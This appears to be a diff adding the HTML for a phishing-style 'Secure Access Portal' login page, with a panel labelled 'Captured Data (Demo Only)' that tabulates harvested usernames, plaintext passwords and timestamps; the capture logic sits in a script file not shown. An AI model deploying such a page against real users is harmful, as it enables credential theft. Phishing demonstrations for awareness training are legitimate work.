@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Access Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div id="app" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+  <div class="container">
+    <h2>Secure Login</h2>
+    <p class="note">Enter your credentials to continue</p>
+    
+    <form id="loginForm">
+      <div class="input-group">
+        <input type="text" id="username" placeholder="Email or Phone" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" required>
+      </div>
+      <button type="submit" id="submitBtn">Login</button>
+      <div id="statusMsg"></div>
+    </form>
+  </div>
+
+  <div id="dataView" class="data-view">
+    <h3 style="margin-bottom: 15px; text-align: center;">Captured Data (Demo Only)</h3>
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>User</th>
+          <th>Password</th>
+          <th>Timestamp</th>
+        </tr>
+      </thead>
+      <tbody id="dataTableBody">
+        <!-- Data will be injected here -->
+      </tbody>
+    </table>
+    <button id="clearData" style="background: #ef4444; margin-top: 20px;">Clear All Data</button>
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
